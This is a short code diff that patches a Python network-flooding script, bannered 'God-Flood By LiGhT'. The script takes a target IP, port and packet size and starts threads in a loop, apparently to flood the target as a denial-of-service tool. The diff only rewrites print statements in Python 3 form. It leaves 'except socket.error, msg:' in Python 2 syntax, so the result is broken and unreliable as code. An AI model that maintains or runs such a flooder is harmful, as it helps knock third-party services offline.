@@ -3,7 +3,7 @@
 import threading, sys, time, random, socket
 
 if len(sys.argv) < 4:
-    print "God-Flood By LiGhT"
+    print ("God-Flood By LiGhT")
     sys.exit("Usage: python "+sys.argv[0]+" <ip> <port> <size>")
 
 ip = sys.argv[1]
@@ -72,8 +72,8 @@ while True:
         t.start()
         s.start()
     except KeyboardInterrupt:
-        print "Stopping Flood!"
+        print ("Stopping Flood!")
         sys.exit()
     except socket.error, msg:
-        print "Socket Couldn't Connect"
+        print ("Socket Couldn't Connect")
         sys.exit()
